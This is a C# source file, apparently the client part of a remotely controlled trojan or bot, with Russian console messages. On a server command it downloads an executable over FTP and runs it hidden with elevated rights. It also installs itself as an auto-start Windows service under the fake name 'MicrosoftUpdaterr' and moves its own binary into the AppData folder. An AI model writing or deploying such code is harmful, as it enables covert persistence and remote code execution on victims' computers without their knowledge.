using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using System.Text;
using System.Threading;

namespace ClientWorker
{
    public class Functions
    {
        FtpClient ftpClient = new FtpClient();

        public void Start()
        {
            ftpClient.Init();
        }

        public void GetUpdater()
        {
            Console.WriteLine("GetUpdate");
            KillUpdater();
            Resetter.pause = true;
            ftpClient.FTPDownloadFile(StartData.updater);
            Process proc = new Process();
            proc.StartInfo.FileName = StartData.updater;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.StartInfo.Verb = "runas";
            try
            {
                proc.Start();
            }
            catch(Exception e)
            {
                Console.WriteLine("The start process failed: {0}", e.ToString());
            }
            Resetter.pause = false;
        }


        private void KillUpdater()
        {
            foreach (var process in Process.GetProcessesByName(StartData.updater))
            {
                process.Kill();
            }
            File.Delete(StartData.updater);
        }

        public void AnalysisAnswer(string answer)
        {
            switch (answer)
            {
                case "DownloadUpdater":                  
                    GetUpdater();
                    break;

                case "":
                case "Reconnect":
                    Reconnect();
                    break;

                default:
                    Console.WriteLine("UnknownCommand " + answer);
                    break;
            }
        }

        public void Reconnect()
        {
            try
            {
                Program.client.Clear();
                Program.clientThread.Abort();
            }
            catch
            {
                Console.WriteLine("Исключение закрытия потока");
            }

            Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
            Program.clientThread.Start();
            Console.WriteLine("Переподключился");
        }

        public void Registration()
        {
            string applicationDataPath = Environment.GetFolderPath(
    Environment.SpecialFolder.ApplicationData);

            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Verb = "runas";

            proc.StartInfo.Arguments = "/C "+ "Sc create MicrosoftServiceUpdaterr binPath= " + applicationDataPath + StartData.floaderNewCopy +
                "Service.exe" +" DisplayName= MicrosoftUpdaterr type= own start= auto";

            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();

            Proliferation(applicationDataPath);
        }
        public void Proliferation(string parth)
        {
            parth = parth + StartData.floaderNewCopy;
            string fileName = Application.ExecutablePath;

            try
            {
                if (Directory.Exists(parth))
                {
                    return;
                }
                else
                {
                    DirectoryInfo di = Directory.CreateDirectory(parth);
                    File.Move(fileName, parth + "Service.exe");                
                }              
            }
            catch (Exception e)
            {
                Console.WriteLine("The process failed: {0}", e.ToString());
            }
                       
        }
    }
}
